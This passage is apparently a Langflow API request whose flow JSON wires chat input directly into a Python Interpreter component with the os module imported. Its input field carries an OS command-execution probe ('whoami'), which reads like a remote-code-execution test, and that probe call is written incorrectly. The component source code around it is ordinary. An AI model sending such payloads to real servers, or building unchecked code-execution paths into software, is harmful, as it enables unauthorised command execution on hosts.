value=\"{text}\",\n            advanced=True,\n            info=\"Template to convert Data to Text. If left empty, it will be dynamically set to the Data's text key.\",\n        ),\n        BoolInput(\n            name=\"clean_data\",\n            display_name=\"Basic Clean Data\",\n            value=True,\n            advanced=True,\n            info=\"Whether to clean data before converting to string.\",\n        ),\n    ]\n    outputs = [\n        Output(\n            display_name=\"Output Message\",\n            name=\"message\",\n            method=\"message_response\",\n        ),\n    ]\n\n    def _build_source(self, id_: str | None, display_name: str | None, source: str | None) -> Source:\n        source_dict = {}\n        if id_:\n            source_dict[\"id\"] = id_\n        if display_name:\n            source_dict[\"display_name\"] = display_name\n        if source:\n            # Handle case where source is a ChatOpenAI object\n            if hasattr(source, \"model_name\"):\n                source_dict[\"source\"] = source.model_name\n            elif hasattr(source, \"model\"):\n                source_dict[\"source\"] = str(source.model)\n            else:\n                source_dict[\"source\"] = str(source)\n        return Source(**source_dict)\n\n    async def message_response(self) -> Message:\n        # First convert the input to string if needed\n        text = self.convert_to_string()\n\n        # Get source properties\n        source, _, display_name, source_id = self.get_properties_from_source_component()\n\n        # Create or use existing Message object\n        if isinstance(self.input_value, Message) and not self.is_connected_to_chat_input():\n            message = self.input_value\n            # Update message properties\n            message.text = text\n            # Preserve existing session_id from the incoming message if it exists\n            existing_session_id = message.session_id\n        else:\n            message = Message(text=text)\n            existing_session_id = None\n\n        # Set message properties\n        message.sender = self.sender\n        message.sender_name = self.sender_name\n        # Preserve session_id from incoming message, or use component/graph session_id\n        message.session_id = (\n            self.session_id or existing_session_id or (self.graph.session_id if hasattr(self, \"graph\") else None) or \"\"\n        )\n        message.context_id = self.context_id\n        message.flow_id = self.graph.flow_id if hasattr(self, \"graph\") else None\n        message.properties.source = self._build_source(source_id, display_name, source)\n\n        # Store message if needed\n        if message.session_id and self.should_store_message:\n            stored_message = await self.send_message(message)\n            self.message.value = stored_message\n            message = stored_message\n\n        self.status = message\n        return message\n\n    def _serialize_data(self, data: Data) -> str:\n        \"\"\"Serialize Data object to JSON string.\"\"\"\n        # Convert data.data to JSON-serializable format\n        serializable_data = jsonable_encoder(data.data)\n        # Serialize with orjson, enabling pretty printing with indentation\n        json_bytes = orjson.dumps(serializable_data, option=orjson.OPT_INDENT_2)\n        # Convert bytes to string and wrap in Markdown code blocks\n        return \"```json\\n\" + json_bytes.decode(\"utf-8\") + \"\\n```\"\n\n    def _validate_input(self) -> None:\n        \"\"\"Validate the input data and raise ValueError if invalid.\"\"\"\n        if self.input_value is None:\n            msg = \"Input data cannot be None\"\n            raise ValueError(msg)\n        if isinstance(self.input_value, list) and not all(\n            isinstance(item, Message | Data | DataFrame | str) for item in self.input_value\n        ):\n            invalid_types = [\n                type(item).__name__\n                for item in self.input_value\n                if not isinstance(item, Message | Data | DataFrame | str)\n            ]\n            msg = f\"Expected Data or DataFrame or Message or str, got {invalid_types}\"\n            raise TypeError(msg)\n        if not isinstance(\n            self.input_value,\n            Message | Data | DataFrame | str | list | Generator | type(None),\n        ):\n            type_name = type(self.input_value).__name__\n            msg = f\"Expected Data or DataFrame or Message or str, Generator or None, got {type_name}\"\n            raise TypeError(msg)\n\n    def convert_to_string(self) -> str | Generator[Any, None, None]:\n        \"\"\"Convert input data to string with proper error handling.\"\"\"\n        self._validate_input()\n        if isinstance(self.input_value, list):\n            clean_data: bool = getattr(self, \"clean_data\", False)\n            return \"\\n\".join([safe_convert(item, clean_data=clean_data) for item in self.input_value])\n        if isinstance(self.input_value, Generator):\n            return self.input_value\n        return safe_convert(self.input_value)\n","fileTypes":[],"file_path":"","password":false,"name":"code","advanced":true,"dynamic":true,"info":"","load_from_db":false,"title_case":false},"context_id":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"context_id","value":"","display_name":"Context ID","advanced":true,"input_types":["Message"],"dynamic":false,"info":"The context ID of the chat. Adds an extra layer to the local memory.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"data_template":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"data_template","value":"{text}","display_name":"Data Template","advanced":true,"input_types":["Message"],"dynamic":false,"info":"Template to convert Data to Text. If left empty, it will be dynamically set to the Data's text key.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"sender":{"tool_mode":false,"trace_as_metadata":true,"options":["Machine","User"],"options_metadata":[],"combobox":false,"dialog_inputs":{},"toggle":false,"override_skip":false,"required":false,"placeholder":"","show":true,"name":"sender","value":"Machine","display_name":"Sender Type","advanced":true,"dynamic":false,"info":"Type of sender.","title_case":false,"track_in_telemetry":true,"external_options":{},"type":"str","_input_type":"DropdownInput"},"sender_name":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"sender_name","value":"AI","display_name":"Sender Name","advanced":true,"input_types":["Message"],"dynamic":false,"info":"Name of the sender.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"session_id":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"session_id","value":"","display_name":"Session ID","advanced":true,"input_types":["Message"],"dynamic":false,"info":"The session ID of the chat. If empty, the current session ID parameter will be used.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"should_store_message":{"tool_mode":false,"trace_as_metadata":true,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"should_store_message","value":true,"display_name":"Store Messages","advanced":true,"dynamic":false,"info":"Store the message in the history.","title_case":false,"track_in_telemetry":true,"type":"bool","_input_type":"BoolInput"}},"description":"Display a chat message in the Playground.","icon":"MessagesSquare","base_classes":["Message"],"display_name":"Chat Output","documentation":"https://docs.langflow.org/chat-input-and-output","minimized":true,"custom_fields":{},"output_types":[],"pinned":false,"conditional_paths":[],"frozen":false,"outputs":[{"types":["Message"],"selected":"Message","name":"message","display_name":"Output Message","method":"message_response","value":"__UNDEFINED__","cache":true,"allows_loop":false,"group_outputs":false,"tool_mode":true}],"field_order":["input_value","should_store_message","sender","sender_name","session_id","context_id","data_template","clean_data"],"beta":false,"legacy":false,"edited":false,"metadata":{"module":"lfx.components.input_output.chat_output.ChatOutput","code_hash":"8c87e536cca4","dependencies":{"total_dependencies":3,"dependencies":[{"name":"orjson","version":"3.10.15"},{"name":"fastapi","version":"0.135.1"},{"name":"lfx","version":null}]}},"tool_mode":false,"lf_version":"1.8.2"},"showNode":false,"type":"ChatOutput","id":"ChatOutput-wI5df"},"selected":false,"measured":{"width":192,"height":52},"dragging":false},{"id":"ChatInput-2W00E","type":"genericNode","position":{"x":-6.202119907925379,"y":819.0885088105424},"data":{"node":{"template":{"_type":"Component","files":{"tool_mode":false,"trace_as_metadata":true,"file_path":"","fileTypes":["csv","json","pdf","txt","md","mdx","yaml","yml","xml","html","htm","docx","py","sh","sql","js","ts","tsx","jpg","jpeg","png","bmp","image"],"temp_file":true,"list":true,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"files","value":"","display_name":"Files","advanced":true,"dynamic":false,"info":"Files to be sent with the message.","title_case":false,"track_in_telemetry":false,"type":"file","_input_type":"FileInput"},"code":{"type":"code","required":true,"placeholder":"","list":false,"show":true,"multiline":true,"value":"from lfx.base.data.utils import IMG_FILE_TYPES, TEXT_FILE_TYPES\nfrom lfx.base.io.chat import ChatComponent\nfrom lfx.inputs.inputs import BoolInput\nfrom lfx.io import (\n    DropdownInput,\n    FileInput,\n    MessageTextInput,\n    MultilineInput,\n    Output,\n)\nfrom lfx.schema.message import Message\nfrom lfx.utils.constants import (\n    MESSAGE_SENDER_AI,\n    MESSAGE_SENDER_NAME_USER,\n    MESSAGE_SENDER_USER,\n)\n\n\nclass ChatInput(ChatComponent):\n    display_name = \"Chat Input\"\n    description = \"Get chat inputs from the Playground.\"\n    documentation: str = \"https://docs.langflow.org/chat-input-and-output\"\n    icon = \"MessagesSquare\"\n    name = \"ChatInput\"\n    minimized = True\n\n    inputs = [\n        MultilineInput(\n            name=\"input_value\",\n            display_name=\"Input Text\",\n            value=\"\",\n            info=\"Message to be passed as input.\",\n            input_types=[],\n        ),\n        BoolInput(\n            name=\"should_store_message\",\n            display_name=\"Store Messages\",\n            info=\"Store the message in the history.\",\n            value=True,\n            advanced=True,\n        ),\n        DropdownInput(\n            name=\"sender\",\n            display_name=\"Sender Type\",\n            options=[MESSAGE_SENDER_AI, MESSAGE_SENDER_USER],\n            value=MESSAGE_SENDER_USER,\n            info=\"Type of sender.\",\n            advanced=True,\n        ),\n        MessageTextInput(\n            name=\"sender_name\",\n            display_name=\"Sender Name\",\n            info=\"Name of the sender.\",\n            value=MESSAGE_SENDER_NAME_USER,\n            advanced=True,\n        ),\n        MessageTextInput(\n            name=\"session_id\",\n            display_name=\"Session ID\",\n            info=\"The session ID of the chat. If empty, the current session ID parameter will be used.\",\n            advanced=True,\n        ),\n        MessageTextInput(\n            name=\"context_id\",\n            display_name=\"Context ID\",\n            info=\"The context ID of the chat. Adds an extra layer to the local memory.\",\n            value=\"\",\n            advanced=True,\n        ),\n        FileInput(\n            name=\"files\",\n            display_name=\"Files\",\n            file_types=TEXT_FILE_TYPES + IMG_FILE_TYPES,\n            info=\"Files to be sent with the message.\",\n            advanced=True,\n            is_list=True,\n            temp_file=True,\n        ),\n    ]\n    outputs = [\n        Output(display_name=\"Chat Message\", name=\"message\", method=\"message_response\"),\n    ]\n\n    async def message_response(self) -> Message:\n        # Ensure files is a list and filter out empty/None values\n        files = self.files if self.files else []\n        if files and not isinstance(files, list):\n            files = [files]\n        # Filter out None/empty values\n        files = [f for f in files if f is not None and f != \"\"]\n\n        session_id = self.session_id or self.graph.session_id or \"\"\n        message = await Message.create(\n            text=self.input_value,\n            sender=self.sender,\n            sender_name=self.sender_name,\n            session_id=session_id,\n            context_id=self.context_id,\n            files=files,\n        )\n        if session_id and isinstance(message, Message) and self.should_store_message:\n            stored_message = await self.send_message(\n                message,\n            )\n            self.message.value = stored_message\n            message = stored_message\n\n        self.status = message\n        return message\n","fileTypes":[],"file_path":"","password":false,"name":"code","advanced":true,"dynamic":true,"info":"","load_from_db":false,"title_case":false},"context_id":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"context_id","value":"","display_name":"Context ID","advanced":true,"input_types":["Message"],"dynamic":false,"info":"The context ID of the chat. Adds an extra layer to the local memory.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"input_value":{"tool_mode":false,"trace_as_input":true,"multiline":true,"ai_enabled":false,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"input_value","value":"","display_name":"Input Text","advanced":false,"input_types":[],"dynamic":false,"info":"Message to be passed as input.","title_case":false,"track_in_telemetry":false,"copy_field":false,"password":false,"type":"str","_input_type":"MultilineInput"},"sender":{"tool_mode":false,"trace_as_metadata":true,"options":["Machine","User"],"options_metadata":[],"combobox":false,"dialog_inputs":{},"toggle":false,"override_skip":false,"required":false,"placeholder":"","show":true,"name":"sender","value":"User","display_name":"Sender Type","advanced":true,"dynamic":false,"info":"Type of sender.","title_case":false,"track_in_telemetry":true,"external_options":{},"type":"str","_input_type":"DropdownInput"},"sender_name":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"sender_name","value":"User","display_name":"Sender Name","advanced":true,"input_types":["Message"],"dynamic":false,"info":"Name of the sender.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"session_id":{"tool_mode":false,"trace_as_input":true,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"session_id","value":"","display_name":"Session ID","advanced":true,"input_types":["Message"],"dynamic":false,"info":"The session ID of the chat. If empty, the current session ID parameter will be used.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"MessageTextInput"},"should_store_message":{"tool_mode":false,"trace_as_metadata":true,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"should_store_message","value":true,"display_name":"Store Messages","advanced":true,"dynamic":false,"info":"Store the message in the history.","title_case":false,"track_in_telemetry":true,"type":"bool","_input_type":"BoolInput"}},"description":"Get chat inputs from the Playground.","icon":"MessagesSquare","base_classes":["Message"],"display_name":"Chat Input","documentation":"https://docs.langflow.org/chat-input-and-output","minimized":true,"custom_fields":{},"output_types":[],"pinned":false,"conditional_paths":[],"frozen":false,"outputs":[{"types":["Message"],"selected":"Message","name":"message","display_name":"Chat Message","method":"message_response","value":"__UNDEFINED__","cache":true,"allows_loop":false,"group_outputs":false,"tool_mode":true}],"field_order":["input_value","should_store_message","sender","sender_name","session_id","context_id","files"],"beta":false,"legacy":false,"edited":false,"metadata":{"module":"lfx.components.input_output.chat.ChatInput","code_hash":"7a26c54d89ed","dependencies":{"total_dependencies":1,"dependencies":[{"name":"lfx","version":null}]}},"tool_mode":false,"lf_version":"1.8.2"},"showNode":false,"type":"ChatInput","id":"ChatInput-2W00E"},"selected":false,"measured":{"width":192,"height":52},"dragging":false},{"id":"PythonREPLComponent-EFpFb","type":"genericNode","position":{"x":308.48481330512084,"y":634.6856811796707},"data":{"node":{"template":{"_type":"Component","code":{"type":"code","required":true,"placeholder":"","list":false,"show":true,"multiline":true,"value":"import importlib\n\nfrom langchain_experimental.utilities import PythonREPL\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import MultilineInput, Output, StrInput\nfrom lfx.schema.data import Data\n\n\nclass PythonREPLComponent(Component):\n    display_name = \"Python Interpreter\"\n    description = \"Run Python code with optional imports. Use print() to see the output.\"\n    documentation: str = \"https://docs.langflow.org/python-interpreter\"\n    icon = \"square-terminal\"\n\n    inputs = [\n        StrInput(\n            name=\"global_imports\",\n            display_name=\"Global Imports\",\n            info=\"A comma-separated list of modules to import globally, e.g. 'math,numpy,pandas'.\",\n            value=\"math,pandas\",\n            required=True,\n        ),\n        MultilineInput(\n            name=\"python_code\",\n            display_name=\"Python Code\",\n            info=\"The Python code to execute. Only modules specified in Global Imports can be used.\",\n            value=\"print('Hello, World!')\",\n            input_types=[\"Message\"],\n            tool_mode=True,\n            required=True,\n        ),\n    ]\n\n    outputs = [\n        Output(\n            display_name=\"Results\",\n            name=\"results\",\n            type_=Data,\n            method=\"run_python_repl\",\n        ),\n    ]\n\n    def get_globals(self, global_imports: str | list[str]) -> dict:\n        \"\"\"Create a globals dictionary with only the specified allowed imports.\"\"\"\n        global_dict = {}\n\n        try:\n            if isinstance(global_imports, str):\n                modules = [module.strip() for module in global_imports.split(\",\")]\n            elif isinstance(global_imports, list):\n                modules = global_imports\n            else:\n                msg = \"global_imports must be either a string or a list\"\n                raise TypeError(msg)\n\n            for module in modules:\n                try:\n                    imported_module = importlib.import_module(module)\n                    global_dict[imported_module.__name__] = imported_module\n                except ImportError as e:\n                    msg = f\"Could not import module {module}: {e!s}\"\n                    raise ImportError(msg) from e\n\n        except Exception as e:\n            self.log(f\"Error in global imports: {e!s}\")\n            raise\n        else:\n            self.log(f\"Successfully imported modules: {list(global_dict.keys())}\")\n            return global_dict\n\n    def run_python_repl(self) -> Data:\n        try:\n            globals_ = self.get_globals(self.global_imports)\n            python_repl = PythonREPL(_globals=globals_)\n            result = python_repl.run(self.python_code)\n            result = result.strip() if result else \"\"\n\n            self.log(\"Code execution completed successfully\")\n            return Data(data={\"result\": result})\n\n        except ImportError as e:\n            error_message = f\"Import Error: {e!s}\"\n            self.log(error_message)\n            return Data(data={\"error\": error_message})\n\n        except SyntaxError as e:\n            error_message = f\"Syntax Error: {e!s}\"\n            self.log(error_message)\n            return Data(data={\"error\": error_message})\n\n        except (NameError, TypeError, ValueError) as e:\n            error_message = f\"Error during execution: {e!s}\"\n            self.log(error_message)\n            return Data(data={\"error\": error_message})\n\n    def build(self):\n        return self.run_python_repl\n","fileTypes":[],"file_path":"","password":false,"name":"code","advanced":true,"dynamic":true,"info":"","load_from_db":false,"title_case":false},"global_imports":{"tool_mode":false,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":true,"placeholder":"","show":true,"name":"global_imports","value":"os","display_name":"Global Imports","advanced":false,"dynamic":false,"info":"A comma-separated list of modules to import globally, e.g. 'math,numpy,pandas'.","title_case":false,"track_in_telemetry":false,"type":"str","_input_type":"StrInput"},"python_code":{"tool_mode":true,"trace_as_input":true,"multiline":true,"ai_enabled":false,"trace_as_metadata":true,"load_from_db":false,"list":false,"list_add_label":"Add More","override_skip":false,"required":true,"placeholder":"","show":true,"name":"python_code","value":"print('Hello, World!')","display_name":"Python Code","advanced":false,"input_types":["Message"],"dynamic":false,"info":"The Python code to execute. Only modules specified in Global Imports can be used.","title_case":false,"track_in_telemetry":false,"copy_field":false,"password":false,"type":"str","_input_type":"MultilineInput"}},"description":"Run Python code with optional imports. Use print() to see the output.","icon":"square-terminal","base_classes":["Data"],"display_name":"Python Interpreter","documentation":"https://docs.langflow.org/python-interpreter","minimized":false,"custom_fields":{},"output_types":[],"pinned":false,"conditional_paths":[],"frozen":false,"outputs":[{"types":["Data"],"selected":"Data","name":"results","display_name":"Results","method":"run_python_repl","value":"__UNDEFINED__","cache":true,"allows_loop":false,"group_outputs":false,"tool_mode":true}],"field_order":["global_imports","python_code"],"beta":false,"legacy":false,"edited":false,"metadata":{"module":"lfx.components.utilities.python_repl_core.PythonREPLComponent","code_hash":"80eeaf032b83","dependencies":{"total_dependencies":2,"dependencies":[{"name":"langchain_experimental","version":"0.3.4"},{"name":"lfx","version":null}]}},"tool_mode":false,"lf_version":"1.8.2"},"showNode":true,"type":"PythonREPLComponent","id":"PythonREPLComponent-EFpFb"},"selected":false,"measured":{"width":320,"height":305}}],"edges":[{"source":"PythonREPLComponent-EFpFb","sourceHandle":"{œdataTypeœ:œPythonREPLComponentœ,œidœ:œPythonREPLComponent-EFpFbœ,œnameœ:œresultsœ,œoutput_typesœ:[œDataœ]}","target":"ChatOutput-wI5df","targetHandle":"{œfieldNameœ:œinput_valueœ,œidœ:œChatOutput-wI5dfœ,œinputTypesœ:[œDataœ,œDataFrameœ,œMessageœ],œtypeœ:œotherœ}","data":{"targetHandle":{"fieldName":"input_value","id":"ChatOutput-wI5df","inputTypes":["Data","DataFrame","Message"],"type":"other"},"sourceHandle":{"dataType":"PythonREPLComponent","id":"PythonREPLComponent-EFpFb","name":"results","output_types":["Data"]}},"id":"xy-edge__PythonREPLComponent-EFpFb{œdataTypeœ:œPythonREPLComponentœ,œidœ:œPythonREPLComponent-EFpFbœ,œnameœ:œresultsœ,œoutput_typesœ:[œDataœ]}-ChatOutput-wI5df{œfieldNameœ:œinput_valueœ,œidœ:œChatOutput-wI5dfœ,œinputTypesœ:[œDataœ,œDataFrameœ,œMessageœ],œtypeœ:œotherœ}","animated":false,"className":"","selected":false},{"source":"ChatInput-2W00E","sourceHandle":"{œdataTypeœ:œChatInputœ,œidœ:œChatInput-2W00Eœ,œnameœ:œmessageœ,œoutput_typesœ:[œMessageœ]}","target":"PythonREPLComponent-EFpFb","targetHandle":"{œfieldNameœ:œpython_codeœ,œidœ:œPythonREPLComponent-EFpFbœ,œinputTypesœ:[œMessageœ],œtypeœ:œstrœ}","data":{"targetHandle":{"fieldName":"python_code","id":"PythonREPLComponent-EFpFb","inputTypes":["Message"],"type":"str"},"sourceHandle":{"dataType":"ChatInput","id":"ChatInput-2W00E","name":"message","output_types":["Message"]}},"id":"xy-edge__ChatInput-2W00E{œdataTypeœ:œChatInputœ,œidœ:œChatInput-2W00Eœ,œnameœ:œmessageœ,œoutput_typesœ:[œMessageœ]}-PythonREPLComponent-EFpFb{œfieldNameœ:œpython_codeœ,œidœ:œPythonREPLComponent-EFpFbœ,œinputTypesœ:[œMessageœ],œtypeœ:œstrœ}","animated":false,"className":"","selected":false}]},"inputs":{"input_value":"print(os.system('whoami').read())","session":"1950c4d2-9064-4f0e-88be-79ec06f3f433","client_request_time":1784168539138}}
```